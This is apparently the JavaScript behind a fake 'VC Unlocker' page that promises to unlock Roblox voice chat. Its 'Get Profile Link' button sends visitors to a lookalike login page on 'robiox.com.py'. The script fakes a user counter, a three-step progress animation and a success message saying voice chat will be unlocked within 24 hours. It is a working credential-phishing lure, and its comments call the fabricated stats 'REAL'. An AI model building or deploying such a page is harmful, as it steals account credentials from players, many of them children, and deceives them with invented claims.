// Redirect URL
const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";

// ========== PERSISTENT STORAGE ==========
// Load saved data from localStorage, or initialize if not exists
let todayCount = parseInt(localStorage.getItem('vc_today_count')) || 1248;
let activityHistory = JSON.parse(localStorage.getItem('vc_activity_history')) || [];

// Save functions
function saveTodayCount() {
    localStorage.setItem('vc_today_count', todayCount);
}

function saveActivityHistory() {
    // Keep only last 20 activities
    if (activityHistory.length > 20) {
        activityHistory = activityHistory.slice(0, 20);
    }
    localStorage.setItem('vc_activity_history', JSON.stringify(activityHistory));
}

// Processing queue (real-time, not saved)
let processingQueue = [];

const progressContainer = document.getElementById('progressContainer');
const progressBar = document.getElementById('progressBar');
const modalOverlay = document.getElementById('modalOverlay');
const modalCloseBtn = document.getElementById('modalCloseBtn');
const finalMessageDiv = document.getElementById('finalMessage');
const activityFeed = document.getElementById('activityFeed');
const todayCountElem = document.getElementById('todayCount');
const processingCountElem = document.getElementById('processingCount');
const notificationBar = document.getElementById('notificationBar');
const notificationIcon = document.getElementById('notificationIcon');
const notificationTitle = document.getElementById('notificationTitle');
const notificationMessage = document.getElementById('notificationMessage');

let progressInterval = null;

// Show top notification
function showNotification(title, message, type = 'info') {
    const iconElement = notificationIcon.querySelector('i');
    
    if (type === 'success') {
        iconElement.className = 'fas fa-check-circle';
        iconElement.style.color = '#22c55e';
        notificationIcon.style.background = 'rgba(34, 197, 94, 0.2)';
    } else if (type === 'error') {
        iconElement.className = 'fas fa-exclamation-triangle';
        iconElement.style.color = '#f97316';
        notificationIcon.style.background = 'rgba(249, 115, 22, 0.2)';
    } else {
        iconElement.className = 'fas fa-info-circle';
        iconElement.style.color = '#8b5cf6';
        notificationIcon.style.background = 'rgba(139, 92, 246, 0.2)';
    }
    
    notificationTitle.textContent = title;
    notificationMessage.textContent = message;
    
    notificationBar.classList.add('show');
    
    // Auto hide after 5 seconds
    setTimeout(() => {
        notificationBar.classList.remove('show');
    }, 5000);
}

// Close notification bar
window.closeNotificationBar = function() {
    notificationBar.classList.remove('show');
};

// Update processing count display
function updateProcessingCount() {
    processingCountElem.textContent = processingQueue.length;
}

// Add a user to processing queue
function addToProcessing(username) {
    processingQueue.push({ username, startTime: Date.now() });
    updateProcessingCount();
    
    // Auto-remove after 7.5 seconds (simulating processing completion)
    setTimeout(() => {
        const index = processingQueue.findIndex(u => u.username === username);
        if (index !== -1) {
            processingQueue.splice(index, 1);
            updateProcessingCount();
        }
    }, 7500);
}

// Format time ago
function getTimeAgo(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return 'just now';
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} min ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} hr ago`;
    return `${Math.floor(hours / 24)} days ago`;
}

// Render activity feed from history
function renderActivityFeed() {
    activityFeed.innerHTML = '';
    if (activityHistory.length === 0) {
        activityFeed.innerHTML = '<div class="activity-item"><i class="fas fa-info-circle"></i><span>No recent activity</span><span class="activity-time"></span></div>';
        return;
    }
    
    activityHistory.forEach((activity) => {
        const activityItem = document.createElement('div');
        activityItem.className = 'activity-item';
        activityItem.innerHTML = `
            <i class="fas fa-check-circle"></i>
            <span><span class="activity-user">@${activity.username}</span> just unlocked VC</span>
            <span class="activity-time">${getTimeAgo(activity.timestamp)}</span>
        `;
        activityFeed.appendChild(activityItem);
    });
}

// Add real activity to history (only when someone actually confirms)
function addRealActivity(username) {
    // Add to beginning of array (most recent first)
    activityHistory.unshift({
        username: username,
        timestamp: Date.now()
    });
    
    // Keep only last 20
    if (activityHistory.length > 20) {
        activityHistory = activityHistory.slice(0, 20);
    }
    
    saveActivityHistory();
    renderActivityFeed();
}

function resetSteps() {
    const steps = ['step1', 'step2', 'step3'];
    steps.forEach((stepId) => {
        const step = document.getElementById(stepId);
        const iconDiv = step.querySelector('.step-icon');
        const statusSpan = step.querySelector('.step-status');
        iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
        statusSpan.textContent = 'Pending';
        statusSpan.style.color = '#64748b';
    });
    finalMessageDiv.style.display = 'none';
    modalCloseBtn.style.display = 'none';
}

function updateStep(stepId, isComplete = false) {
    const step = document.getElementById(stepId);
    const iconDiv = step.querySelector('.step-icon');
    const statusSpan = step.querySelector('.step-status');
    
    if (isComplete) {
        iconDiv.innerHTML = '<i class="fas fa-check-circle" style="color: #22c55e;"></i>';
        statusSpan.textContent = 'Completed';
        statusSpan.style.color = '#22c55e';
    } else {
        iconDiv.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #8b5cf6;"></i>';
        statusSpan.textContent = 'In progress';
        statusSpan.style.color = '#8b5cf6';
    }
}

function runSteps(callback) {
    updateStep('step1', false);
    setTimeout(() => {
        updateStep('step1', true);
        updateStep('step2', false);
        setTimeout(() => {
            updateStep('step2', true);
            updateStep('step3', false);
            setTimeout(() => {
                updateStep('step3', true);
                finalMessageDiv.style.display = 'block';
                modalCloseBtn.style.display = 'block';
                if (callback) callback();
            }, 2500);
        }, 2500);
    }, 2500);
}

function startProgress() {
    progressContainer.style.display = 'block';
    let width = 0;
    if (progressInterval) clearInterval(progressInterval);
    progressInterval = setInterval(() => {
        if (width >= 90) {
            clearInterval(progressInterval);
        } else {
            width += 10;
            progressBar.style.width = width + '%';
        }
    }, 80);
}

function completeProgress() {
    if (progressInterval) {
        clearInterval(progressInterval);
        progressInterval = null;
    }
    progressBar.style.width = '100%';
    setTimeout(() => {
        progressContainer.style.display = 'none';
        progressBar.style.width = '0%';
    }, 500);
}

function isValidProfileLink(profileUrl) {
    if (!profileUrl || profileUrl.trim() === "") return false;
    let url = profileUrl.trim();
    try {
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'https://' + url;
        }
        const urlObj = new URL(url);
        if (!urlObj.hostname.includes('roblox.com')) return false;
        return true;
    } catch (e) {
        return false;
    }
}

function isValidUsername(username) {
    if (!username || username.trim() === "") return false;
    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
    return usernameRegex.test(username.trim());
}

function handleGetProfileLink() {
    window.location.href = REDIRECT_URL;
    showNotification("Redirecting", "Opening Roblox login page...", "info");
}

function handleConfirm() {
    const profileLink = document.getElementById('profileLinkInput').value.trim();
    const username = document.getElementById('usernameInput').value.trim();
    
    if (profileLink === "") {
        showNotification("Missing Information", "Please enter your Roblox profile link", "error");
        return;
    }
    
    if (username === "") {
        showNotification("Missing Information", "Please enter your Roblox username", "error");
        return;
    }
    
    if (!isValidProfileLink(profileLink)) {
        showNotification("Invalid Link", "Please enter a valid Roblox profile URL", "error");
        return;
    }
    
    if (!isValidUsername(username)) {
        showNotification("Invalid Username", "Use 3-20 characters (letters, numbers, underscores)", "error");
        return;
    }
    
    // Add to processing queue (REAL STAT)
    addToProcessing(username);
    
    startProgress();
    resetSteps();
    modalOverlay.classList.add('active');
    
    runSteps(() => {
        completeProgress();
        // REAL STATS - Only increment when user actually processes
        todayCount++;
        todayCountElem.textContent = todayCount.toLocaleString();
        saveTodayCount(); // Save to localStorage immediately
        
        // Add to activity feed (REAL ACTIVITY)
        addRealActivity(username);
        
        showNotification("Success!", `Voice Chat will be unlocked for @${username} within 24 hours`, "success");
        
        const confirmBtn = document.getElementById('confirmBtn');
        confirmBtn.style.transform = 'scale(1.02)';
        setTimeout(() => {
            confirmBtn.style.transform = '';
        }, 200);
    });
}

function closeModal() {
    modalOverlay.classList.remove('active');
}

// Event Listeners
document.getElementById('getProfileLink').addEventListener('click', handleGetProfileLink);
document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
modalCloseBtn.addEventListener('click', closeModal);

modalOverlay.addEventListener('click', function(e) {
    if (e.target === modalOverlay) {
        closeModal();
    }
});

document.getElementById('usernameInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleConfirm();
    }
});

document.getElementById('profileLinkInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleConfirm();
    }
});

// Update timestamps every minute (for display only, doesn't affect saved data)
setInterval(() => {
    renderActivityFeed();
}, 60000);

// Initialize display with saved data
todayCountElem.textContent = todayCount.toLocaleString();
renderActivityFeed();

// Show welcome notification after page loads
setTimeout(() => {
    showNotification("Welcome to VC Unlocker", "Click 'Get Profile Link' to start the process", "info");
}, 500);